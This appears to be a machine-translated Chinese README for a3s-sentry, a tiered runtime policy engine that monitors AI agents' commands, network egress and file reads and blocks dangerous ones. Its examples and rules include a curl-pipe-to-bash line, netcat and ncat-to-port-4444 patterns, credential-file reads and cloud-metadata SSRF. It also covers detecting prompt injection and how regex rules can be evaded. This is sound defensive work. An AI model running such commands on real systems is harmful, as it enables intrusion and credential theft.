# a3s-哨兵

<p>
  <strong>Language / 语言:</strong>
  <a href="README.md">English</a> ·
  <a href="README.zh-CN.md">中文</a>
</p>


**人工智能代理的分层运行时安全控制。** Sentry 是人工智能代理的策略大脑
[a3s-observer](https://github.com/A3S-Lab/Observer)：它读取观察者的事件流——代理是什么
运行、发送、升级——通过**三个升级层**判断每个事件，并向下推一个块
当有危险时，观察者的内核守卫。代理零变更；内核做了
的执行。

```
observer NDJSON ─▶ L1 rules ──escalate─▶ L2 LLM ──escalate─▶ L3 a3s-code agent
   (what the          │ block               │ block              │ block
    agent did)        ▼                      ▼                    ▼
                   Enforcer ──▶ observer deny-files ──▶ kernel denies (EPERM)
```

这三层以成本换取深度，因此昂贵的判断只能在廉价判断无法解决的问题上进行：

|等级 |机制|延迟|运行于|
|---|---|---|---|
| **L1** |确定性正则表达式规则引擎（ACL 可配置）|微秒|每场活动|
| **L2** |快速 LLM 分类器（OpenAI 兼容端点）| ~100 秒毫秒 | L1事件升级 |
| **L3** |具有安全技能的深度 [a3s-code](https://github.com/AI45Lab/Code) 特工 |秒–分钟|事件L2升级|
| **美国汽车工程师协会** |模型残差流上的稀疏自动编码器，由 [a3s-power](https://github.com/A3S-Lab/Power) 在 TEE 中挖掘 | 〜女士|模型输出 `LlmActivations` 事件 |

L1 直接捕获明确的情况并标记其余情况； L2 快速给出第二意见； L3
实际上进行了调查——在上下文中阅读事件，考虑攻击链——
真正的疑难案件。每个层都是一个`Judge`，因此该集合是可交换的并且经过单元测试。

第四个并行层 — **SAE** — 判断完全不同的信号：模型的*自己的输出*，
通过其内部特征而不是其（可混淆的）文本。参见
[SAE — mechanistic interpretability](#sae--mechanistic-interpretability-of-model-output)。

## 它如何适合 a3s-observer

Sentry 正是观察者自述文件留给您的“您的控制器”* 部分：

```
events (NDJSON) → sentry (L1/L2/L3 rules) → deny-file → observer guard → kernel denies (EPERM)
```

观察者提供 **信号** (`ToolExec`, `SslContent`, `SecurityAction`, `Egress`, `Dns`,
`FileAccess`）和**执行原语**（egress / file / exec拒绝归档其守卫
热重载）。哨兵决定。它本身从不强制执行任何事情——保持它是一个纯粹的政策大脑，并且
内核是单一执行点。

对于`ToolExec`，观察者还报告argv是否被截断或无法完全重新组装。
Sentry 仍然会阻止明显危险的捕获前缀，但会阻止模糊不完整的命令
作为 L1 升级停止，而不是成为普通允许或基于缺失的模型决策
证据。

## 安装

从存储库自己的 GitHub Actions 发布（`vX.Y.Z` 标签运行 [`release.yml`](.github/workflows/release.yml)）：

- **Rust crate** — `cargo add a3s-sentry@0.8.0` 用于嵌入策略引擎和内联线
  在另一个 Rust 进程中进行检查。
- **守护进程映像** — `ghcr.io/a3s-lab/sentry:0.8.0`（和 `:latest`）。 L1 + L2 开箱即用；对于 L3
  将 Node + `@a3s-lab/code` 层放入派生图像中。
  `docker run --rm -i ghcr.io/a3s-lab/sentry:latest < events.ndjson`
- **守护程序二进制文件** — `a3s-sentry-x86_64-linux`
  [`v0.8.0` release](https://github.com/A3S-Lab/Sentry/releases/tag/v0.8.0)。
- **来自来源** — `cargo build --release` → `target/release/sentry`。
- **SD​​K** — `npm install @a3s-lab/sentry` (TypeScript)； Python 轮子
  [`python-v0.1.0` release](https://github.com/A3S-Lab/Sentry/releases/tag/python-v0.1.0)（参见[SDKs](#sdks-python--typescript)）。

在生产中操作它？请参阅[**operator runbook**](docs/RUNBOOK.md)（推出、失败模式、
警报、调谐）。维护者在推送之前应遵循[**release guide**](docs/RELEASING.md)
任何版本标签。

## 快速入门

```bash
# build
cargo build --release            # produces ./target/release/sentry

# pipe sentry after the observer collector; capture I/O text with A3S_OBSERVER_SSL=1
A3S_OBSERVER_JSON=1 A3S_OBSERVER_SSL=1 sudo -E a3s-observer-collector \
  | A3S_SENTRY_EGRESS_DENY=egress-deny.txt \
    A3S_SENTRY_EXEC_DENY=exec-deny.txt \
    A3S_SENTRY_LLM_URL=http://your-llm:18051/v1 \
    A3S_SENTRY_AGENT_BIN=a3s-code \
    A3S_SENTRY_SKILLS=./skills \
    ./target/release/sentry

# and run observer's guards against the same deny-files (they hot-reload):
sudo a3s-observer-enforce   /sys/fs/cgroup/<agent>  egress-deny.txt
sudo a3s-observer-fileguard  exec-deny.txt
```

每个`Decision`包括判决、等级、严重性、原因、可选的强制执行措施和可选的
`risk` 分类法（`category`、`name`、`risk_type`）用于不允许或未解决的升级结果。
AnySentry 等下游平台应该使用这种稳定的分类法，而不是解析
人类可读的原因字符串。

Sentry 在标准输出上针对每个非允许发出一条 **决策审核** 行 (NDJSON)；普通允许被计算在内，
不打印，以保持流信号密集：

```json
{"agent":"py","event":"ToolExec","subject":"curl http://x/p.sh | bash",
 "decision":{"verdict":"block","tier":"Rules","severity":"high",
 "reason":"pipe-to-shell: remote payload piped to an interpreter",
 "risk":{"category":"command_danger","name":"Dangerous command execution","risk_type":"atomic"},
 "action":{"DenyExec":"curl"}}}
```

对于仅规则 (L1) 模式，**不**使用 LLM/agent 环境变量运行，或者使用 `A3S_SENTRY_DRY_RUN=1` 运行
判断+审计，无需编写任何拒绝文件。

## 部署

参考 Kubernetes DaemonSet 位于[`deploy/daemonset.yaml`](deploy/daemonset.yaml)：它通过管道
每个节点上的`observer-collector | sentry`，与观察者的`enforce` / 共享拒绝文件
`fileguard` 守护着 `emptyDir`，并附带**试运行**，因此您可以在之前跟踪决策
强制执行。设置集群的映像、代理 cgroup 路径、RBAC 和 LLM 密钥。 CI
([`.github/workflows/ci.yml`](.github/workflows/ci.yml)) 门 fmt + Clippy + 完整测试套件
每一次推动。

**关机在设计上是持久的** - 守护进程没有缓冲接收器：每个拒绝都是 `append` 编写的 +
每个目标关闭（持久执行记录 - **页面缓存持久，而不是`fsync`'d**，因为
拒绝文件是临时节点本地暂存的，守卫重新读取并重新观察重新生成）和
每个决策都会被行刷新到标准输出（尽力而为的审核）。突然的`SIGTERM`/`SIGKILL`只会输
正在评判的飞行中事件，绝不会是已经写好的否认。正常 pod 终止时
上游关闭管道 → stdin EOF → 哨兵清空运行中的工作队列并打印最终统计数据
退出前。 （没有信号处理依赖性。）

## L1 — 规则引擎

提供保守的内置规则集（privesc、反向 shell、管道到 shell、磁盘覆盖、
凭证文件访问、I/O 中的秘密/注入标记、云元数据 SSRF）。只有明确的
案例`block`；剩下的`escalate`到L2/L3而不是猜测。使用 ACL 策略扩展或覆盖
（`A3S_SENTRY_POLICY=policy/rules.acl`）：

```hcl
rules = [
  { name = "no-netcat", on = "ToolExec", match = "(?i)\\b(ncat|netcat)\\b",
    verdict = "block", severity = "medium", reason = "netcat", action = "deny-exec" },
]
```

第一场比赛获胜；没有匹配=允许完整的证据。不完整的 `ToolExec` 会跳过匹配
当没有危险的阻止规则匹配时，允许规则并在 L1 升级。参见
[`policy/rules.acl`](policy/rules.acl)。

## 动态策略和嵌入

**热重载。** 策略文件受到监视 - 从任何程序（控制器、您的配置
系统、操作员）并且规则更新**在约 2 秒内生效，无需重新启动**。解析错误会保留
当前的规则，因此错误的编辑永远不会解除引擎的武装。这是与语言无关的驾驶方式
动态哨兵：您的逻辑，用任何语言，都会重写 ACL。

**嵌入它。** Sentry 是一个库——在进程中构建管道并在运行时应用配置更改：

```rust
use a3s_sentry::{LiveRules, LlmJudge, Pipeline, Severity};
use std::{sync::Arc, time::Duration};

let rules = Arc::new(LiveRules::new(Some("rules.acl".into()))?);   // hot-reloadable
let pipeline = Pipeline::new(rules.clone())                        // L1
    .with_l2(Arc::new(LlmJudge::new("http://llm:18051/v1", "glm", None, Duration::from_secs(10))))
    .speculate_above(Some(Severity::High))   // run L2 + L3 in parallel on high-risk
    .fail_closed(false);

let decision = pipeline.evaluate(&observed_event);   // your own event source
let fast = pipeline.evaluate_through_l2(&observed_event); // persist escalations for external L3
rules.reload()?;   // force-apply config changes now (e.g. on a signal / admin API)
```

每个层都是一个 `Judge` 特征实现，因此您可以将 L1/L2/L3 替换为您自己的（不同的模型、
内部规则集）并保留升级机制。 `evaluate_through_l2` 从不调用 L3 或
适用`fail_closed`；调用者必须持久地发送任何 `Escalated` 结果，而不是将其视为
一个允许。

## 摘要限制工作负载策略信封

云/节点集成可以构建一个规范的[`PolicyEnvelope`](docs/POLICY_ENVELOPE.md)，
将本机 ACL 策略字节绑定到确切的工作负载、修订版、副本、节点和正代。
节点解析器重新计算`sha256:`规范策略摘要并仅接受规范信封
字节；然后`verify`需要可信的所需身份、生成和摘要来精确匹配。

```rust
use a3s_sentry::{PolicyBinding, PolicyEnvelope, PolicyExpectation};

let binding = PolicyBinding::new("workload-01", "revision-07", "replica-01", "node-03")?;
let envelope = PolicyEnvelope::from_policy_acl(
    binding.clone(),
    4,
    r#"runtime_policy "sentry-v1" { default = "deny" }"#,
)?;
let received = PolicyEnvelope::parse(envelope.canonical_acl())?;
let expected = PolicyExpectation::new(binding, 4, envelope.policy_digest())?;
received.verify(&expected)?;
```

这是一个不可变的入场合同，而不是应用状态证据。当前的拒绝文件执行者
仍然是节点全局和身份盲的；在输入 future 之前，工作负载不得准备就绪
后端证明完全应用了相同的摘要。请参阅
[policy-envelope contract and boundaries](docs/POLICY_ENVELOPE.md)。

## SDK（Python·TypeScript）

**本机、进程内** SDK — 通过 PyO3 (Python) 和 napi-rs 嵌入的 Rust L1/L2/L3 判断
（TypeScript），与[`@a3s-lab/code`](https://github.com/A3S-Lab/Code)相同的模型。建立法官
来自一个 ACL 配置（守护进程的整个配置位于单个文件中 — 规则 + L2/L3 后端 + 接收器）以及
评估进程中的观察者事件；没有守护进程，没有子进程。每一个都通过真实事件的判断来验证
通过嵌入式引擎（云元数据 SSRF → `block`/`DenyEgress`；SDK 编写的 ACL 规则
在 `tier=Rules` 开火）。

- **Python** — [`sdk/python`](sdk/python)。 abi3 轮子 (py3.9+) 位于
  [`python-v0.1.0` release](https://github.com/A3S-Lab/Sentry/releases/tag/python-v0.1.0)—
  `pip install` 适用于您平台的轮子（尚未在 PyPI 上，匹配 a3s 代码）：

  ```python
  from a3s_sentry import Sentry, egress, tool_exec

  sentry = Sentry.create("sentry.acl")               # ACL file path or content
  d = sentry.evaluate(egress(1, "169.254.169.254", 80))   # cloud-metadata SSRF
  print(d.verdict, d.action.kind, d.action.target)   # block DenyEgress 169.254.169.254
  d2, enforced = sentry.evaluate_and_enforce(tool_exec(2, ["/usr/bin/ncat", "h", "4444"]))
  ```

- **TypeScript** — [`sdk/typescript`](sdk/typescript)，在 npm 上运行：`npm install @a3s-lab/sentry`（节点 ≥12）：

  ```ts
  import { Sentry, egress, fileAccess } from "@a3s-lab/sentry";

  const sentry = Sentry.create("sentry.acl");
  const d = sentry.evaluate(egress(1, "169.254.169.254", 80));
  if (d?.verdict === "block") console.log(d.reason, d.action); // { kind: "DenyEgress", target: "…" }

  // Run L1 only. An escalation is preserved for a caller-owned identity/tier router and no model
  // is contacted, even when the ACL contains L2/L3 configuration.
  const l1 = sentry.evaluateL1(
    fileAccess(1, "/home/u/.aws/credentials", false),
  );
  if (l1?.nextTierEligible) await durableFastQueue.send(l1);

  const fast = await sentry.evaluateThroughL2(
    fileAccess(1, "/home/u/.aws/credentials", false),
  );
  if (fast.nextTierEligible) await durableL3Queue.send(fast);
  ```

`sentry.acl` 配置 — 规则、可选 `llm {}` (L2) / `agent {}` (L3) 后端和 `deny {}`
接收器 — 显示在每个 SDK 的自述文件中。事件构建器（`egress`、`toolExec`、`dns`、`fileAccess`、
`sslContent`、`securityAction`) 构造`evaluate` 所采用的事件 JSON。

## 内联门 — 在线上预执行

L1–L3 层也运行**内联**：在代理的 LLM/MCP 请求到达模型之前，判断
解码正文并**从中编辑秘密/PII**（agentfw 式本地防火墙）。检测重复使用
现有的层逐字记录 - 线路内容被包装为 `SslContent` 事件，因此内置
`prompt-injection` / `secret-in-egress` 规则（以及任何 L2 LLM 防护）在没有新的判断逻辑的情况下触发。
真正的新作品是**屏蔽**：具体跨越出站占位符的代理交换
并恢复入站，因此真正的秘密永远不会离开机器。

```rust
use a3s_sentry::{Sentry, Direction};

let sentry = Sentry::create("sentry.acl")?;
let d = sentry.inspect_wire(request_body, Direction::Request);
if d.blocked() { /* → 4xx, never forward */ }
let (masked, restores) = d.apply(request_body);   // forward `masked`; reverse `restores` on the response
```

`inspect_wire` 返回一个 [`InlineDecision`] (`crate::inline`)：分层的 `Decision` 加上一个
`Vec<Redaction>`（字节跨度，每个都有一个稳定的`{{A3S_REDACTED:<kind>:<n>}}`占位符）。 `apply`
从右到左交换其占位符的每个跨度（因此较早的偏移量保持有效）并返回
屏蔽文本加上代理保留的`placeholder → original`映射以恢复真实值
配对响应。 **检测和屏蔽是正交的** - 内容可以被允许*并且*仍然具有
密钥被屏蔽掉； a `Block` 仅停止转发，不会阻止编辑。

内置检测器集是正则表达式驱动且保守的：PEM 私钥、提供商密钥形状
（OpenAI `sk-`、Stripe `sk_live_`/`sk_test_`、Google `AIza…`、AWS `AKIA…` + `aws_secret_access_key`、
GitHub、Slack、JWT）、`Bearer` / 标记的秘密（`api_key=`、`token=`、`password=`，… — 仅
值被屏蔽，标签保留上下文）和电子邮件。重叠的匹配项**合并为一个
跨度**（通过延伸跨度的末端来折叠重叠器，切勿丢弃它），这样秘密就可以
永远不要留下裸露的尾巴。

**姿势是故障开放**：屏蔽*始终*适用，但检测仅**升级** -
*仅*当 L2 防护硬阻止它时，提示注入请求才会被保留（或`A3S_SENTRY_FAIL_CLOSED=1`
解决了未解决的升级到`Block`）。对于安全第一的直列门，运行 L2 或设置
`fail_closed`；仅规则 + 故障打开仍然掩盖秘密，但转发请求。

内联传输位于**a3s-gateway**（`wire`功能）——位于`/wire/<agent>/...`的本地代理
解码调用，调用`inspect_wire`，应用判决，并将屏蔽请求转发到
真正的提供者。

## 推测并行性

默认情况下，各层串行运行（仅当 L2 升级时，才运行 L2，然后是 L3）。套装`A3S_SENTRY_SPECULATE=high`
（或`.speculate_above(Some(Severity::High))`），并且当 **L1 升级到或超过该严重程度时，L2
和 L3 并发运行** — L3 的深度查找立即开始，而不是在 L2 之后。快速 L2 `Block`
响应时间短路；否则 L3 的更深层判决（已经在运行，所以准备得更快）是
权威的。高风险事件得到彻底检查，无需支付串行 L2+L3 延迟 — 在
始终为他们运行 L3 的成本（投机交易）。

## L3 — 深度特工调查

L3 是一个真正的[a3s-code](https://github.com/A3S-Lab/Code) 特工，负责*调查*已标记的事件 —
加载安全技能并推理参与者、攻击链和爆炸半径 —
而不是像 L2 那样进行单个分类调用。通过桥接脚本启用它：

```bash
npm i -g @a3s-lab/code           # the agent SDK
… | A3S_SENTRY_AGENT_BIN=$PWD/scripts/l3-agent.mjs \
    A3S_SENTRY_SKILLS=$PWD/skills \
    A3S_SENTRY_L3_URL=http://your-llm:18051/v1 A3S_SENTRY_L3_KEY=… A3S_SENTRY_L3_MODEL=glm5.1-w4a8 \
    a3s-sentry
```

`scripts/l3-agent.mjs` 使用 [`skills/`](skills) playbook 运行 a3s-code 代理并返回
`{verdict,severity,reason}` JSON。当 **L2 升级** 时，就达到了 L3（LLM 确实这么说）
不能告诉），**如果没有配置 L2，则直接从 L1**，或者**推测**与 L2 一起
高风险事件。它使用`A3S_SENTRY_L3_*`（回落到`A3S_SENTRY_LLM_*`），因此L3可以运行
比 L2 更强/不同的模型——或者根本不用 L2 运行。根据实时 a3s 代码 + GLM 进行验证：
SSH 私钥读取 → `block` 与代理推理 *“一个通用的 Python 解释器，不是已知的
SSH客户端…密钥材料加载到内存后可以向外传输。"*

## SAE — 模型输出的机械解释性

L1-L3 层判断代理*做了什么*（观察者的系统调用/网络事件）。 **SAE 级别**
判断模型*说*的内容——它的输出——并且它是**白盒**：而不是阅读
完成文本（攻击者可以对其进行 base64/密码混淆），它读取模型自己的
**剩余流功能**。

[a3s-power](https://github.com/A3S-Lab/Power) 在 TEE 内为模型提供服务，利用剩余流
在一层，使用稀疏自动编码器对其进行编码，并**仅**发出稀疏的 `(feature_id,
activate)` pairs as an `LlmActivations` 事件 — 提示/完成明文永远不会离开
飞地。 Sentry 的 `SaeJudge` 根据标记的特征字典对这些特征进行评分：

- **白盒** - 判断模型的*内部概念*，因此混淆的有害输出仍然会亮起
  其概念特征；
- **机密** — 只能看到功能 ID/激活，而不能看到文本（模型在 TEE 中运行）；
- **可解释** — 分数在命名特征中是线性的，分解为排名驱动程序
  (`exploit-code-synthesis (#8801) → 0.82`)，不是第二个黑匣子。

```hcl
sae { dict = "features.json"  escalate_at = 0.3  block_at = 0.6 }   # mech-interp tier (optional)
```

特征字典（`feature_id → {concept, category, weight, severity}`）是一个离线工件：
为所服务的模型训练或采用 SAE，探测 + 标记其安全相关功能，以及
因果验证每个标签（消除特征，确认分数移动）。模型输出事件路由至
这一层（不是规则链）； SAE 升级仍可以交给深层 L3 代理处理。 `Decision`
具有`explain`（`SaeScore`：每个类别得分+排名驱动程序）的可解释性
仪表板。输出文本没有内核拒绝目标，因此 SAE 块依赖于封闭的目标
`ToolExec`/`Egress` 动作事件。 a3s-power 链的一侧计划于
[its `docs/sae-interpretability-plan.md`](https://github.com/A3S-Lab/Power/blob/main/docs/sae-interpretability-plan.md)。

## 配置（环境）

|变量 |效果|
|---|---|
| `A3S_SENTRY_POLICY` |额外的 L1 规则 (ACL)；内置函数始终适用； **热重装** (~2s) |
| `A3S_SENTRY_LLM_URL` |启用L2；兼容 OpenAI 的聊天基 URL (`…/v1`) |
| `A3S_SENTRY_LLM_MODEL` / `_KEY` | L2 模型名称/不记名令牌 |
| `A3S_SENTRY_AGENT_BIN` |启用L3；代理命令（例如`scripts/l3-agent.mjs`）|
| `A3S_SENTRY_SKILLS` | L3 安全技能目录（参见[`skills/`](skills)）|
| `A3S_SENTRY_L3_URL` / `_KEY` / `_MODEL` | L3代理的LLM（回落到`A3S_SENTRY_LLM_*`）|
| `A3S_SENTRY_EGRESS_DENY` / `_FILE_DENY` / `_EXEC_DENY` |观察者拒绝文件将块附加到|
| `A3S_SENTRY_FAIL_CLOSED` |未解决的升级**阻止**（默认：失败打开/允许）|
| `A3S_SENTRY_SPECULATE` |当 L1 升级到 ≥ 此严重性（例如 `high`）时，**并行**运行 L2+L3 |
| `A3S_SENTRY_LLM_TIMEOUT` | L2 请求超时（以秒为单位）（默认 **30**；推理模型需要约 15–30 秒）|
| `A3S_SENTRY_AGENT_TIMEOUT` | L3 调查超时（以秒为单位）（默认 120） |
| `A3S_SENTRY_WORKERS` / `_QUEUE` | L2/L3 工作线程（默认 4）+ 升级队列深度（默认 256）|
| `A3S_SENTRY_DRY_RUN` |判断+审计，永远不要写拒绝文件|
| `A3S_SENTRY_METRICS_ADDR` |在此 `ip:port` 上服务 Prometheus `/metrics` + `/healthz`（例如 `0.0.0.0:9100`；默认关闭）|

## 可观察性

设置 `A3S_SENTRY_METRICS_ADDR` （例如 `0.0.0.0:9100`）来暴露，没有额外的依赖：

- **`GET /metrics`** — 普罗米修斯计数器：`sentry_events_total`、`sentry_blocked_total`、
  **`sentry_overload_degraded_total`**（升级被整个工作队列拒绝），以及
  **`sentry_enforce_failed_total`**（拒绝写入错误的块）。对于*故障开放*控制那些
  最后两个是**警报** - 两者都意味着执行路径可能尚未完成。
- **`GET /healthz`** — `200 ok` 当进程处于活动状态时（k8s 活动/就绪探针
  [`deploy/daemonset.yaml`](deploy/daemonset.yaml) 击中此）。

## 诚实的界限

- **L1 是一个廉价的预过滤器，而不是沙箱。** 正则表达式规则是可规避的（混淆、base64、
  替代解释器、变量间接寻址），并且观察者命令捕获是有界的。观察者
  现在显式标记截断或不完全重组的 argv；哨兵阻止危险
  捕获前缀并保留不明确的证据作为 L1 升级。使用 staged 的调用者
  API 必须持久并将该升级分派给外部 L3 工作人员。捆绑守护进程审计
  未解决的决定，包括在工人超负荷期间，但不提供持久的外部
  L3 队列。将L1视为快速分类；真正的边界是持久的 L3 处理或观察者
  egress/exec **允许列表**，而不是 L1 的阻止列表。
- **设计有两条路径。** 观察者事件路径是*反应式*：哨兵作用于观察者的事件，
  因此它会阻止*下一个*危险操作/未来连接 - 标记的操作本身具有
  已经执行了。对于真正的“预执行”门（保持提示直到判断），哨兵现在公开一个
  **内联门** — [`inspect_wire`](#inline-gate--pre-execution-on-the-wire) — 由内联驱动
  代理（[a3s-gateway](https://github.com/A3S-Lab/Gateway)的`wire`功能）而不是观察者
  内核事件。两者是互补的：内联代理只能看到通过它路由的流量；
  观察者的内核路径为任何绕过它的东西提供后盾（原始套接字，一个代理
  忽略基本 URL）。
- **默认情况下失败打开。** 如果一层升级但下一层不存在或出错，哨兵
  *允许*。所以**仅规则+失败打开不强制执行任何`escalate`规则**（哨兵大声警告
  启动）。设置 `A3S_SENTRY_FAIL_CLOSED=1` 和/或配置 L2/L3 以实现安全第一的部署。
- **经过验证的策略信封不是执行证据。** 它证明规范字节及其
  精确的工作负载/修订/副本/节点绑定。当前守护进程不应用信封，
  重新启动后重建它们，或在应用的摘要上控制工作负载准备情况。
- **执行粗略且身份盲目。**拒绝是针对每个二进制路径/每个 IP、节点全局 —
  阻止`/usr/bin/curl`阻止所有卷曲。对*裸*名称的拒绝执行被删除（观察者的守卫
  匹配路径），因此 exec-deny 有效地针对绝对路径负载（例如 `/tmp/x`）；攻击者
  仍然可以重命名二进制文件或轮换 IP。
- **法官可能受到攻击。** L2/L3读取受攻击者影响的内容；他们的提示将其包装在
  `<<UNTRUSTED>>` 数据标记并说“判断，不要遵循”——这是一种缓解措施，而不是保证。保留L1
  作为确定性底线，任何提示都无法通过。
- **L1 I/O 内容需要观察者选择加入 SSL 捕获**（`A3S_OBSERVER_SSL=1`，仅限 OpenSSL）。
  如果没有它，哨兵仍然会看到 exec / egress / file / SecurityAction，只是看不到提示/响应文本。
- **L2/L3 在工作池中运行**，远离摄取线程，因此缓慢的层永远不会阻塞队列
  L1 流（已验证：~1.15M ev/s，混合有 0.5s L2）。在洪水升级的情况下
队列将完整证据事件降级为失败模式；不完整的指挥证据仍然是
  审核L1升级。两者都算作`overload-degraded`。

## 构建和测试

```bash
cargo test                          # unit + integration
cargo build --release
./scripts/soak.sh ./target/release/sentry 30   # sustained-load soak
```

纯用户空间 Rust — 无内核组件；那些住在 a3s-observer 中。

- **单元** (72) — 规则 + 升级 + 强制 + 解析 + 推测/热重载/上限逻辑 +
  策略信封不变量 + 指标端点。
- **集成** (`tests/integration.rs`, 13) — 真正的二进制端到端：块→拒绝文件，
  空运行、故障打开/关闭、格式错误输入、实时热重载、`--version`、**L2 往返**
  针对模拟 OpenAI 端点，**L3 代理**路径（模拟代理→阻止→拒绝文件），**过载
  处理**（慢速 L3 + 队列=1 → 优雅的完整证据降级，同时不完整证据
  保持升级）和**指标端点**（实时`/metrics`计数器+`/healthz`）。全部
  CI 可重现。
- **策略合约** (`tests/policy_envelope.rs`, 7) — 规范往返，语义摘要
  稳定性、有效负载/摘要篡改拒绝、所有四个身份不匹配维度、过时/未来
  代、有界模式准入、重复字段拒绝和编辑失败。
- **Soak** (`scripts/soak.sh` + `scripts/soak-l2.sh`) — 持续混合负载 + 负载下策略重写
  （10M+ 事件、RSS 平坦、0 次恐慌、重复数据删除限制）；和 **工作池浸泡** 证明 L2 永远不会很慢
  head-of-line-阻塞 L1 流（**~1.15M ev/s，Linux 上有 0.5s L2**，RSS 平坦 6.5 MB，优雅
  过载退化）。
- **真正的 LLM + 代理** — 针对实时 `glm5.1-w4a8` 进行 L2 验证：阻止凭证读取，
  *允许*自述文件中使用占位符秘密（减少误报）。真实模型（~16s —
  推理模型）暴露了旧的硬编码 10 秒超时在真正的威胁下会失败**开放**；
  现在默认为 30 秒并且可调。 **L3 针对真正的 a3s 代码代理进行验证**：SSH 私钥
  阅读 → 一个深入的、攻击链感知的`block`（代理推断攻击者不是已知的 SSH
  客户端和密钥可从内存中窃取）——真正比 L2 的单一分类更深。
- **准确性** — 在 69 个事件标记的语料库上测量（[`eval/`](eval)、`cargo run --example eval`）：
  **仅 L1 召回率为 47.8% / 准确率 100% / FP 为 0%**； **L1+L2（实时 GLM）95.7% 召回率/100% 准确率/
  0% FP**。评估发现+修复了 3 个实际问题（裸露 `rm -rf /` 遗漏、`.env` 未发现、OOB-exfil
  域太宽松）。数字是诚实的，而不是渴望的——语料库+工具都在仓库中。

## 布局

|文件 |角色 |
|---|---|
| `verdict.rs` | `Decision` / `Verdict` / `Severity` / `EnforceAction` |
| `event.rs` |将观察者NDJSON解析为判断的`Event` |
| `rules.rs` | **L1** 规则引擎 + 内置默认值 |
| `llm.rs` | **L2** LLM 分类器 |
| `agent.rs` | **L3** a3s 代码调查员 |
| `pipeline.rs` | `Judge` 特质 + L1→L2→L3 升级 |
| `policy.rs` |规范的工作负载策略范围+精确的可信状态验证|
| `enforce.rs` |将块附加到观察者拒绝文件 |
| `metrics.rs` |普罗米修斯 `/metrics` + `/healthz` 端点 |
| `bin/sentry.rs` |守护进程（stdin → 判断 → 执行 → 审核）|
| `deploy/daemonset.yaml` |参考k8s DaemonSet（观察者→哨兵→守卫）|
| `.github/workflows/ci.yml` | CI：fmt + Clippy + 完整测试套件 |

## 许可证

MIT
